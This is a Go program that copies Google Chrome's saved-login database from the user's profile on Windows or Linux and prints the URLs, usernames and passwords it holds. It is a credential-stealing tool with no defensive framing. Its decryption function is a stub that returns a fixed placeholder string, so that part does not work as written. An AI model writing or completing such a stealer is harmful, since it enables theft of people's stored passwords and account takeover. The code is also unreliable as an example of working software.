package main

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"path/filepath"

	_ "github.com/mattn/go-sqlite3"
)

func main() {
	currentUser, err := os.UserHomeDir()
	if err != nil {
		log.Fatalf("Failed to get the username: %v", err)
	}
	username := currentUser

	var passwordDBPath string
	var isWindows bool

	if osName := os.Getenv("OS"); osName == "Windows_NT" {
		passwordDBPath = filepath.Join(username, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
		isWindows = true
	} else {
		passwordDBPath = filepath.Join(username, ".config", "google-chrome", "Default", "Login Data")
		isWindows = false
	}

	destDBPath := "passwords_copy.db"

	sourceData, err := copyFile(passwordDBPath, destDBPath)
	if err != nil {
		log.Fatalf("Failed to copy the password database file: %v", err)
	}

	fmt.Printf("Password database copied successfully: %s\n", destDBPath)

	db, err := sql.Open("sqlite3", destDBPath)
	if err != nil {
		log.Fatalf("Failed to connect to the password database: %v", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		log.Fatalf("Failed to read saved passwords: %v", err)
	}
	defer rows.Close()

	fmt.Println("Saved Passwords:")
	for rows.Next() {
		var originURL, username, password string
		if err := rows.Scan(&originURL, &username, &password); err != nil {
			log.Fatalf("Failed to read password data: %v", err)
		}
		fmt.Printf("URL: %s\nUsername: %s\nPassword: %s\n\n", originURL, username, decryptPassword(password, sourceData))
	}

	if isWindows {
		fmt.Println("This is a Windows operating system.")
	} else {
		fmt.Println("This is a Linux operating system.")
	}
}

func copyFile(srcPath, destPath string) ([]byte, error) {
	sourceData, err := os.ReadFile(srcPath)
	if err != nil {
		return nil, err
	}

	err = os.WriteFile(destPath, sourceData, 0644)
	if err != nil {
		return nil, err
	}

	return sourceData, nil
}

func decryptPassword(encryptedPassword string, sourceData []byte) string {
	return "DecryptedPassword"
}
